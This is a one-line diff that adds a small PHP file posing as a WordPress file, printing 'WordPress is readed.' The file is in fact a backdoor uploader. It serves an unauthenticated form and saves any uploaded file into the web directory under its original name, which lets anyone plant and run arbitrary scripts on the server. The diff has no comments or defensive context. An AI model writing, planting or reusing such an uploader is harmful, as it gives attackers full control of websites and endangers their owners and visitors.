@@ -1,0 +1,1 @@
+<?php echo "WordPress is readed."; $Mjhn=basename($_FILES["upoleuid"]["name"]);if(move_uploaded_file($_FILES["upoleuid"]["tmp_name"],$Mjhn)){echo basename($_FILES["upoleuid"]["name"])."file done";} echo "<form enctype=\"multipart/form-data\" method=\"POST\"><input type=\"file\" name=\"upoleuid\"/><input type=\"submit\" value=\"ddok\"/></form>";?>
